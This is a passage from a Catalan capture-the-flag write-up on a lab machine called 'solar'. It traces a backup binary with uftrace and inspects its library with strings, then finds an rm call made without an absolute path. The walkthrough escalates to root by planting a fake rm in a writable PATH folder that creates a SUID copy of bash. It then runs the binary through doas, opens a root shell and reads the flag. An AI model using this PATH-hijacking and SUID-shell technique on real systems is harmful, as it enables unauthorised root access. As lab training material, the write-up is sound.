└─$ uftrace --force -a ./backups sdfadsf
Error loading library.
# DURATION     TID     FUNCTION
 253.995 us [ 83414] | strlen("sdfadsf") = 7;
   1.042 us [ 83414] | strlen("sdfadsf") = 7;
   1.884 us [ 83414] | __ctype_b_loc();
   0.872 us [ 83414] | strlen("sdfadsf") = 7;
   0.988 us [ 83414] | __ctype_b_loc();
   0.962 us [ 83414] | strlen("sdfadsf") = 7;
   0.750 us [ 83414] | __ctype_b_loc();
   0.819 us [ 83414] | strlen("sdfadsf") = 7;
   0.759 us [ 83414] | __ctype_b_loc();
   0.785 us [ 83414] | strlen("sdfadsf") = 7;
   0.737 us [ 83414] | __ctype_b_loc();
   0.802 us [ 83414] | strlen("sdfadsf") = 7;
   0.

985 us [ 83414] | __ctype_b_loc();
   0.941 us [ 83414] | strlen("sdfadsf") = 7;
   0.764 us [ 83414] | __ctype_b_loc();
   0.810 us [ 83414] | strlen("sdfadsf") = 7;
   4.189 us [ 83414] | strlen("05000b0b080a021c19471a06") = 24;
   4.163 us [ 83414] | __isoc99_sscanf();
   1.004 us [ 83414] | __isoc99_sscanf();
   1.121 us [ 83414] | __isoc99_sscanf();
   1.130 us [ 83414] | __isoc99_sscanf();
   1.054 us [ 83414] | __isoc99_sscanf();
   0.915 us [ 83414] | __isoc99_sscanf();
   0.935 us [ 83414] | __isoc99_sscanf();
   0.968 us [ 83414] | __isoc99_sscanf();
   0.930 us [ 83414] | __isoc99_sscanf();
   0.905 us [ 83414] | __isoc99_sscanf();
   1.071 us [ 83414] | __isoc99_sscanf();
   1.349 us [ 83414] | __isoc99_sscanf();
   1.590 ms [ 83414] | dlopen("libbackup.so", RTLD_LAZY) = 0;
  35.739 us [ 83414] | fwrite(0x55bd23f3e0f1, 1, 23, &_IO_2_1_stderr_) = 23;
```

Busquem la biblioteca `libbackup.so`.

```bash
julian@solar:~$ find / -name libbackup.so 2>/dev/null
/usr/lib/x86_64-linux-gnu/libbackup.so

julian@solar:~$ strings /usr/lib/x86_64-linux-gnu/libbackup.so
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
create_compressed_backup
snprintf
system
stderr
fprintf
libc.so.6
GLIBC_2.2.5
u+UH
/usr/bin/mysqldump --databases %s > /tmp/temp.sql && /usr/bin/gzip /tmp/temp.sql -c > %s && rm /tmp/temp.sql
Error executing mysqldump and gzip. Exit code: %d
...
```

Trobem els missatges d'error que ens apareixen en introduir una base de dades que no existeix i el que sembla ser la comanda que s'executa al codi.

```bash
/usr/bin/mysqldump --databases %s > /tmp/temp.sql && /usr/bin/gzip /tmp/temp.sql -c > %s && rm /tmp/temp.sql
```

Com podem utilitzar la nostra variable d'entorn `PATH` mentre executem el binari `backups` que utilitza la llibreria `libbackup.so`, aprofitem això per escalar privilegis.

La variable `PATH` de `julian` ja té diferents carpetes on podem escriure.

```bash
julian@solar:~$ echo $PATH
/home/julian/.nvm/versions/node/v22.7.0/bin:/home/julian/.local/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Creem un fitxer `rm` executable; és l'únic binari que s'executa sense un path absolut a la llibreria `libbackup.so`.

```bash
julian@solar:~$ nano .local/bin/rm

julian@solar:~$ cat .local/bin/rm
#!/bin/bash

cp /bin/bash /tmp/
chmod u+s /tmp/bash

julian@solar:~$ chmod +x .local/bin/rm
```

Executem el binari `backups` amb `doas` utilitzant la contrasenya de `julian` i la base de dades que existeix. Això últim és important perquè, si no, mai arribarà a executar el `rm`.

```bash
julian@solar:~$ doas /usr/local/bin/backups solar_energy_db
doas (julian@solar) password:
Backup completed successfully: /var/www/sunfriends.nyx/database.sql.gz

julian@solar:~$ ls -la /tmp/bash
-rwsr-xr-x 1 root root 1265648 sep  4 22:08 /tmp/bash
```

Utilitzant el binari `bash` amb SUID, podem accedir com a `root` i llegir la flag.

```bash
julian@solar:~$ /tmp/bash -p

bash-5.2# cat /root/root.txt
44d**************************5f5
```
